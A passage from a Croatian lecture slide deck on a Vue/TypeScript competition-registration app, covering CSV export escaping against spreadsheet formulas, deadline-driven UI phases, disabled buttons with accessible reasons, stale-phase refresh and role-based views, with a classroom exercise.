  if (/[";\r\n]/.test(text)) text = `"${text.replaceAll('"', '""')}"`
  return text
}
\end{lstlisting}

\vspace{0.3em}
Vrijednost koja počinje znakom kojim kalkulator započinje formulu dobiva apostrof na početku i ostaje tekst.

\vspace{0.3em}
Zatim se vrijednost s navodnikom, razdjelnikom ili prijelomom retka stavlja u navodnike, a navodnik u njoj se udvostručuje.

\vspace{0.3em}
Zaštita stoji na mjestu na kojem podatak prelazi u drugi program: pri sastavljanju datoteke, a ne pri upisu imena.
\end{frame}

% ============================================================
\sekcija{Korisničko sučelje koje poznaje pravila}{Razdoblje u odgovoru, radnje izvedene iz razdoblja, skrivena i onemogućena radnja, razlog uz gumb, razdoblje koje zastari, prikaz prema ulozi.}

% ------------------------------------------------------------
\begin{frame}[fragile]{Odbijena radnja (I)}
Korisničko sučelje koje ne zna za rokove nakon konačnog roka izgleda isto kao prije njega. Klub klikne \enquote{Odjavi} uz jednu prijavu:

\begin{lstlisting}
POST /api/competitions/1/registrations/41/withdraw
400 {"code": "deadline_passed",
     "message": "Izmjene nisu <@moguće@> nakon finalnog roka"}
\end{lstlisting}

\vspace{0.5em}
Poslužitelj radnju ispravno odbija. Korisnik o pravilu saznaje tek nakon što je radnju pokušao, iz poruke o pogrešci.

\vspace{0.5em}
Tako je sa svakom radnjom u svakom retku: korisničko sučelje nudi radnje koje poslužitelj u tom trenutku odbija.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Odbijena radnja (II)}
Prvi odgovor koji se nameće je razdoblje izračunati u pregledniku, iz dvaju rokova. Isti uvjet tada stoji na dvama mjestima, a sat preglednika i sat poslužitelja ne moraju pokazivati isto vrijeme.

\vspace{0.4em}
Drugi je odgovor razdoblje preuzeti od poslužitelja. Odgovor o natjecanju ima polje \texttt{phase}, koje poslužitelj računa pri svakom zahtjevu:

\begin{lstlisting}[language=json]
{"id": 1, "name": "Zimski kup", "date": "2027-03-14",
 "prelim_deadline": "2027-02-14T22:59:00Z",
 "final_deadline": "2027-03-07T22:59:00Z", "phase": "open"}
\end{lstlisting}

\vspace{0.3em}
Vrijednosti su \texttt{open}, \texttt{prelim\_passed} i \texttt{closed}. Korisničko sučelje iz razdoblja izvodi koje radnje nudi, a pravilo i dalje provodi poslužitelj.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Radnje izvedene iz razdoblja}
\begin{lstlisting}[language=typescript]
// src/lib/phase.ts
const MATRIX: Record<Phase, AllowedActions> = {
  open: { register: true, changeStatus: true },
  prelim_passed: { register: false, changeStatus: true },
  closed: { register: false, changeStatus: false },
}
export const allowedActions = (phase: Phase): AllowedActions =>
  MATRIX[phase]
\end{lstlisting}

\begin{lstlisting}[language=typescript]
// src/components/ClubRegistrations.vue
const allowed = computed(() => allowedActions(props.competition.phase))
\end{lstlisting}

\vspace{0.2em}
Matrica prepisuje pravila koja na poslužitelju provodi sloj \texttt{services}, pa se mijenja zajedno s njima.

\vspace{0.2em}
Imena kažu što se smije, a ne koje je razdoblje. Novo razdoblje mijenja jedan redak matrice, a ne uvjet uz svaki gumb.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Skriveno ili onemogućeno}
\vspace{0.3em}
\begin{center}
{\small
\setlength{\tabcolsep}{6pt}
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{@{}L{3.6cm}L{3.6cm}L{3.8cm}@{}}
  \toprule
   & \textbf{Skriveno} & \textbf{Onemogućeno} \\
  \midrule
  U stablu elemenata & nema ga & ima ga, bez odziva \\
  Korisnik zna za radnju & ne & da \\
  Razlog & nema ga & tekst uz radnju \\
  \bottomrule
\end{tabular}
}
\end{center}

\vspace{0.6em}
\begin{konvencija}
Radnju koju korisnik u svojoj ulozi nikada ne smije izvesti korisničko sučelje skriva: klub ne vidi poveznicu na administraciju. Radnja koja je bila dopuštena, a više nije, ostaje vidljiva i onemogućena, uz razlog; nestala bez traga izgledala bi kao kvar.
\end{konvencija}
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Razlog uz onemogućeni gumb}
Opis u atributu \texttt{title} pojavi se tek kad miš stoji iznad gumba. Tipkovnica i dodir ga ne prikazuju, a onemogućeni gumb ne može dobiti fokus.

\begin{lstlisting}[language=html]
<!-- src/components/ClubRegistrations.vue -->
<p v-if="!allowed.changeStatus" id="change-reason" class="note">
  {{ REASONS.changeStatus }}
</p>
...
<button class="btn btn-secondary btn-small" type="button"
  :disabled="!allowed.changeStatus"
  :aria-describedby="allowed.changeStatus ? undefined : 'change-reason'"
  @click="changeStatus(r)">
\end{lstlisting}

\vspace{0.1em}
Razlog zato stoji kao tekst iznad tablice, vidljiv svima. \texttt{aria-describedby} ga veže uz svaki gumb, pa ga čitač zaslona pročita uz natpis gumba.

\vspace{0.2em}
Obrazac nove prijave nakon preliminarnog roka zamjenjuje rečenica s razlogom, jer bi cijeli obrazac bez odziva samo zauzimao mjesto.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Razdoblje koje zastari (I)}
Razdoblje je pročitano pri otvaranju stranice. Korisnik stranicu ostavi otvorenu, a rok u međuvremenu istekne.

\vspace{0.6em}
\begin{itemize}
  \itemsep0.45em
  \item Gumb i dalje izgleda dopušten, jer je \texttt{phase} iz starog odgovora.
  \item Poslužitelj zahtjev odbija s kodom \texttt{deadline\_passed}, jer vrijeme čita u trenutku zahtjeva.
\end{itemize}

\pause
\vspace{0.7em}
Odbijanje je ispravno i jedina je pouzdana obrana. Korisničko sučelje ne može znati kada će netko pomaknuti rok ni kada će rok isteći dok stranica stoji otvorena.

\vspace{0.6em}
Ono što korisničko sučelje može jest prepoznati da je prikazano razdoblje zastarjelo i dohvatiti natjecanje ponovno, da se gumbi usklade s novim razdobljem.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Razdoblje koje zastari (II)}
\begin{lstlisting}[language=typescript]
// src/composables/useStatusChange.ts
async function changeStatus(registration: Registration) {
  try {
    ...
  } catch (e) {
    ...
    if (e instanceof ApiError && e.code === 'deadline_passed')
      options.onStale()
    throw e
  }
}
\end{lstlisting}

\vspace{0.3em}
Odgovor \texttt{deadline\_passed} znači da prikazano razdoblje više ne vrijedi. Komponenta poziv \texttt{onStale} prosljeđuje roditelju kao događaj \texttt{stale}, a stranica natjecanja na njega dohvaća natjecanje ponovno.

\vspace{0.3em}
Iznimka se zatim baca dalje, pa korisnik i dalje dobiva poruku o pogrešci.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Razdoblje koje zastari (III)}
Stranica ostavljena otvorenom u drugoj kartici ne šalje zahtjeve, pa zastarjelo razdoblje ne otkriva ni odbijen zahtjev. Preglednik javlja kad korisnik karticu ponovno pogleda:

\begin{lstlisting}[language=typescript]
// src/views/CompetitionView.vue
function refreshWhenVisible() {
  if (document.visibilityState === 'visible' && competition.value) load()
}
document.addEventListener('visibilitychange', refreshWhenVisible)
onBeforeUnmount(() =>
  document.removeEventListener('visibilitychange', refreshWhenVisible))
\end{lstlisting}

\vspace{0.3em}
Povratkom na karticu natjecanje se dohvaća ponovno, a gumbi se usklađuju s razdobljem prije nego ih korisnik pritisne.

\vspace{0.3em}
Slušatelj se uklanja kad komponenta nestane. Inače bi ostao na dokumentu i dohvaćao natjecanje i nakon odlaska sa stranice.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Prikaz prema ulozi (I)}
Klub i organizator otvaraju istu stranicu natjecanja i šalju isti zahtjev za prijave. Ono što s popisom rade toliko se razlikuje da jedna tablica ne odgovara obojici:

\vspace{0.5em}
\begin{center}
{\small
\setlength{\tabcolsep}{6pt}
\renewcommand{\arraystretch}{1.25}
\begin{tabular}{@{}L{3.4cm}L{3.6cm}L{3.6cm}@{}}
  \toprule
   & \textbf{Klub} & \textbf{Organizator} \\
  \midrule
  Prijava na natjecanju & nekoliko & stotine \\
  Dohvat & jedan zahtjev & po stranicama \\
  Obrazac nove prijave & da & ne \\
  Pretraga i izvoz & ne & da \\
  \bottomrule
\end{tabular}
}
\end{center}

\vspace{0.6em}
Klub cijeli svoj popis dobiva jednim zahtjevom, a organizator popis koji raste dobiva po stranicama, uz pretragu i izvoz.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Prikaz prema ulozi (II)}
\begin{lstlisting}[language=html]
<!-- src/views/CompetitionView.vue -->
<template v-if="auth.isAdmin">
  <h2>Prijave svih klubova</h2>
  <AdminRegistrations :competition="competition" @stale="load" />
</template>
<ClubRegistrations v-else :competition="competition" @stale="load" />
\end{lstlisting}

\vspace{0.3em}
Odjava i povratak isti su u obama prikazima, pa su izdvojeni u \codefile{src/composables/useStatusChange.ts}, koji oba prikaza pozivaju.

\vspace{0.3em}
Uloga bira prikaz. Podatke koje klub smije vidjeti i dalje bira poslužitelj: klub koji bi otvorio prikaz organizatora dobio bi od istog zahtjeva samo svoje prijave.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Vježba: razdoblje koje zastari}
U običnom prozoru preglednika prijavljeni ste kao klub \texttt{behemot@plreg.hr}, a u privatnom kao organizator \texttt{admin@plreg.hr}.

\vspace{0.5em}
\begin{enumerate}
  \itemsep0.3em
  \item Kao klub dodajte natjecateljicu Petru Kos, rođenu 03.03.2003., ženskog spola, i otvorite \emph{Zimski kup}.
  \item Kao organizator, u administraciji natjecanja, pomaknite preliminarni rok \emph{Zimskog kupa} na 01.11.2026. u 23:59.
  \item U prozoru kluba, bez osvježavanja, prijavite Petru Kos u kategoriji \texttt{63}.
  \item Kao organizator pomaknite konačni rok na 02.11.2026. u 23:59.
  \item U prozoru kluba prijeđite na drugu karticu i vratite se.
  \item Kao organizator vratite rokove na 14.02.2027. i 07.03.2027. u 23:59.
\end{enumerate}

\vspace{0.5em}
Što se u prozoru kluba promijenilo nakon trećeg i nakon petog koraka i koji je događaj pokrenuo svaku od tih promjena?
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Sažetak}
\begin{itemize}
  \itemsep0.2em
  \item Popis koji raste dohvaća se po stranicama.
  \item Bez ukupnog broja zapisa zapis viška kaže postoji li sljedeća stranica.
  \item Stranica i filtar stoje u adresi, a adresa je ulaz korisnika.
  \item Filtar koji bira zapise pripada poslužitelju.
  \item Pretraga u pregledniku obuhvaća samo prikazanu stranicu.
  \item Imena se razvrstavaju po hrvatskoj abecedi i pretražuju bez dijakritika.
  \item Potvrdu traži radnja koja se ne poništava, a dijalog drži fokus.
  \item Izvoz dohvaća cijeli popis i ne izvodi formule iz podataka.
  \item Radnje nad retkom izvode se iz razdoblja koje šalje poslužitelj.
  \item Radnja koja više nije dopuštena ostaje vidljiva, onemogućena i s razlogom.
  \item Zastarjelo razdoblje usklađuje se ponovnim dohvatom natjecanja.
\end{itemize}
\end{frame}

\end{document}
